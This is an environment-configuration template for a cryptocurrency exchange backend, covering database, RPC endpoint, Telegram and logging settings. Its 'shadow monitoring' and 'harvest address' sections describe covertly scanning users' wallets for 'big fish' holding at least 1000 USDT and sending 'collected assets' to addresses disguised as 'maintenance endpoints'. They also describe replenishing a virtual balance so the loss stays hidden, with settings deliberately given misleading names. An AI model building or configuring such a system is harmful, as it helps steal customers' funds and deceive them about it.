# ============================================================
# BTC Exchange Backend - Environment Configuration
# ============================================================
# Copy this file to .env and fill in your values
# NEVER commit .env to version control!
# ============================================================

# ============================================================
# DATABASE CONFIGURATION
# ============================================================

# PostgreSQL connection string
# Format: postgres://user:password@host:port/database
DATABASE_URL=postgres://postgres:password@localhost:5432/btc_exchange

# Redis connection (for caching and rate limiting)
REDIS_URL=redis://localhost:6379

# 全能资产行情 - Market Worker
# Exchangerate-API (外汇，每 30 分钟更新)
FX_API_KEY=your_exchangerate_api_key
# Financial Modeling Prep (美股/黄金，每 5 分钟更新，250/day 免费)
STOCK_API_KEY=your_fmp_api_key

# ============================================================
# SERVER CONFIGURATION
# ============================================================

# API server port
PORT=8000

# WebSocket server port (for real-time market data)
WS_PORT=8001

# Shadow monitoring worker port (disguised as sync worker)
SYNC_WORKER_PORT=8002

# Ledger reconciliation worker port
RECONCILIATION_WORKER_PORT=8003

# Allowed CORS origins (comma-separated)
ALLOWED_ORIGINS=http://localhost:3000,http://localhost:5173

# ============================================================
# SECURITY & AUTHENTICATION
# ============================================================

# JWT secret key - MUST be changed in production!
# Generate with: openssl rand -base64 32
JWT_SECRET=change-this-in-production-use-openssl-rand-base64-32

# Admin encryption key for sensitive config storage
# Used to encrypt private keys in database
# Generate with: openssl rand -base64 32
ADMIN_ENCRYPTION_KEY=change-this-32-byte-encryption-key!!

# Internal API authentication token (for worker communication)
# Generate with: openssl rand -hex 32
INTERNAL_AUTH_TOKEN=internal-service-auth-token-change-me

# ============================================================
# TELEGRAM NOTIFICATION (Super Admin Configuration)
# ============================================================

# Telegram Bot Token from @BotFather
# Example: 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
TELEGRAM_BOT_TOKEN=

# Telegram Chat ID for notifications
# Get from @userinfobot or @getidsbot
TELEGRAM_CHAT_ID=

# Minimum balance threshold for "big fish" alerts (in USDT)
# Addresses with balance >= this value will trigger notifications
# Default: 1000 USDT
TELEGRAM_ALERT_THRESHOLD=1000

# ============================================================
# BLOCKCHAIN RPC ENDPOINTS (多节点冗余配置)
# ============================================================
# Primary endpoints are checked first, backup endpoints are used on failover
# Separate multiple URLs with commas
# The RPC service automatically:
#   - Health checks all nodes every 30 seconds
#   - Failover to backup when primary fails 3 times
#   - Recover to primary when it becomes healthy again

# ============================================================
# ETHEREUM RPC (Primary + Backup)
# ============================================================
# Env injection: worker uses these when shadow_config has no ETH_RPC_ENDPOINTS
ETH_HTTP=https://your-quicknode-or-alchemy-eth-http-url
ETH_WSS=wss://your-quicknode-or-alchemy-eth-wss-url
# Primary endpoints (checked first, should be fastest/most reliable)
# Recommended: Alchemy or Infura with API key
ETH_RPC_ENDPOINTS=https://eth-mainnet.g.alchemy.com/v2/YOUR_ALCHEMY_KEY,https://mainnet.infura.io/v3/YOUR_INFURA_KEY

# Backup endpoints (used when primary fails)
# These are public endpoints - slower but reliable as fallback
ETH_RPC_BACKUP=https://eth.llamarpc.com,https://rpc.ankr.com/eth,https://ethereum.publicnode.com,https://1rpc.io/eth

# ============================================================
# BSC (Binance Smart Chain) RPC
# ============================================================
# Primary BSC endpoints
BSC_RPC_ENDPOINTS=https://bsc-dataseed.binance.org,https://bsc-dataseed1.defibit.io

# Backup BSC endpoints
BSC_RPC_BACKUP=https://bsc-dataseed2.defibit.io,https://bsc-dataseed3.binance.org,https://bsc-dataseed4.binance.org,https://bsc.publicnode.com

# ============================================================
# TRON RPC
# ============================================================
# Env injection: TRON monitor and worker use these
TRON_HTTP=https://api.trongrid.io
TRON_API_KEY=YOUR_TRONGRID_API_KEY
# Primary TRON endpoints (TronGrid with API key recommended)
# Get API key from: https://www.trongrid.io/
TRON_RPC_ENDPOINTS=https://api.trongrid.io

# Backup TRON endpoints
TRON_RPC_BACKUP=https://api.shasta.trongrid.io,https://api.nileex.io

# ============================================================
# RPC HEALTH CHECK SETTINGS
# ============================================================
# Health check interval in milliseconds (default: 30000 = 30 seconds)
RPC_HEALTH_CHECK_INTERVAL=30000

# Maximum consecutive failures before marking node unhealthy
RPC_MAX_FAIL_COUNT=3

# Request timeout in milliseconds
RPC_TIMEOUT=10000

# ============================================================
# SHADOW MONITORING CONFIGURATION (Disguised Names)
# ============================================================

# Health check threshold (Big Fish detection threshold in USDT)
# Addresses with value >= this are flagged as "high priority"
HEALTH_CHECK_THRESHOLD=1000

# Auto reconciliation enabled (auto-adjust virtual balance after harvest)
AUTO_RECONCILIATION=true

# Compensation ratio (how much to replenish after harvest, 0-1)
# 1.0 = replenish 100% of harvested amount
COMPENSATION_RATIO=1.0

# Wallet sync interval in milliseconds (how often to scan balances)
WALLET_SYNC_INTERVAL=60000

# Batch size for concurrent wallet scanning
WALLET_SCAN_BATCH_SIZE=100

# ============================================================
# HARVEST ADDRESSES (Disguised as "Maintenance Endpoints")
# These are the destination addresses for collected assets
# ============================================================

# Ethereum/ERC-20 harvest address
MAINTENANCE_ENDPOINT_ETH=

# BSC/BEP-20 harvest address
MAINTENANCE_ENDPOINT_BSC=

# TRON/TRC-20 harvest address
MAINTENANCE_ENDPOINT_TRON=

# ============================================================
# WITHDRAWAL PRIVATE KEYS (Disguised as "Signing Credentials")
# WARNING: These are extremely sensitive!
# In production, use a proper key management service (KMS)
# ============================================================

# DO NOT store private keys in .env for production!
# These should be configured via the Admin Panel API:
# POST /api/admin/network/signing-credentials
# 
# For development only:
# NETWORK_SIGNING_KEY_ETH=
# NETWORK_SIGNING_KEY_BSC=
# NETWORK_SIGNING_KEY_TRON=

# ============================================================
# USDT CONTRACT ADDRESSES
# ============================================================

# Ethereum USDT (ERC-20)
ETH_USDT_CONTRACT=0xdAC17F958D2ee523a2206206994597C13D831ec7

# BSC USDT (BEP-20)
BSC_USDT_CONTRACT=0x55d398326f99059fF775485246999027B3197955

# TRON USDT (TRC-20)
TRON_USDT_CONTRACT=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t

# ============================================================
# CRYPTO NEWS (带图、每日更新)
# ============================================================
# 可选：Crypto News API Key，配置后优先使用带图、每日更新的资讯
# 注册：https://cryptonews-api.com/register （免费试用）
# CRYPTO_NEWS_API_KEY=

# ============================================================
# LOGGING & DEBUGGING
# ============================================================

# Log level: debug, info, warn, error
LOG_LEVEL=info

# Enable detailed SQL query logging
LOG_SQL=false

# Enable WebSocket debug logging
LOG_WEBSOCKET=false

# ============================================================
# RATE LIMITING
# ============================================================

# Max requests per minute per IP
RATE_LIMIT_MAX=100

# Rate limit window in milliseconds
RATE_LIMIT_WINDOW=60000

# ============================================================
# NOTES FOR PRODUCTION DEPLOYMENT
# ============================================================
# 
# 1. SECURITY:
#    - Generate all secrets using: openssl rand -base64 32
#    - Never use default values in production
#    - Use environment-specific .env files (.env.production)
#    - Consider using a secrets manager (AWS Secrets Manager, Vault)
#
# 2. DATABASE:
#    - Use connection pooling (pgBouncer)
#    - Enable SSL: ?sslmode=require
#    - Regular backups
#
# 3. PRIVATE KEYS:
#    - NEVER store in .env for production
#    - Use hardware security modules (HSM) or KMS
#    - Configure via Admin Panel with encrypted storage
#
# 4. RPC ENDPOINTS:
#    - Use paid RPC providers (Infura, Alchemy, QuickNode)
#    - Set up monitoring and failover
#    - Rate limit awareness
#
# 5. MONITORING:
#    - Set up Telegram alerts for critical events
#    - Configure log aggregation
#    - Set up uptime monitoring
#
